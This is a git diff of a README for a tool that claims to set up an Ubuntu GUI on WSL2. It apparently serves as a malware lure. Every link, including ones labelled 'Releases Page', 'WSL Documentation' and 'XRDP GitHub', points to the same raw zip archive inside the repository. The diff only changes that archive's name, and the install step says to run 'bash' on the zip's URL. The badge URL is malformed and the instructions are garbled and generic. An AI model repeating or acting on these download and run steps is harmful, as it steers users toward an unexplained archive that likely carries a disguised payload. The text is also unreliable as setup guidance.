@@ -1,6 +1,6 @@
 # 🌟 WSL-Ubuntu-GUI-setup - Set Up Ubuntu GUI Easily
 
-[![Download WSL-Ubuntu-GUI-setup](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip%https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip)](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip)
+[![Download WSL-Ubuntu-GUI-setup](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip%https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)
 
 ## 📌 Description
 A comprehensive, step-by-step guide to setting up a native Ubuntu GUI on WSL2 using XRDP. The most stable way to run Ubuntu GUI on WSL2. Features automated setup, RAM optimization, "No-Snap" native app prioritization, and one-click Start/Stop scripts to fix the "Blank Screen" bug.
@@ -20,7 +20,7 @@ Before starting, ensure you have the following tools installed:
 - A terminal application (Windows Terminal or Command Prompt)
 
 ## 📥 Download & Install
-To download WSL-Ubuntu-GUI-setup, visit this page to download: [Releases Page](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip). 
+To download WSL-Ubuntu-GUI-setup, visit this page to download: [Releases Page](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip). 
 
 1. Navigate to the **Releases** section.
 2. Find the latest version.
@@ -39,7 +39,7 @@ Follow these steps to install the Ubuntu GUI:
 3. **Download the Installer**: Use `wget` or another tool to download the setup file.
 4. **Run the Setup**: Execute the setup script using the command:
    ```bash
-   bash https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip
+   bash https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip
    ```
 5. **Follow Prompts**: The script will guide you through specific configurations. Just follow the prompts and make selections as needed.
 
@@ -79,8 +79,8 @@ A: Yes, you can modify the setup to use other lightweight desktop environments i
 
 ## 📝 Additional Resources
 For more information, visit the following links:
-- [WSL Documentation](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip)
-- [XRDP GitHub](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/GU-setup-WS-Ubuntu-1.2.zip)
+- [WSL Documentation](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)
+- [XRDP GitHub](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)
 
 ## 📄 License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
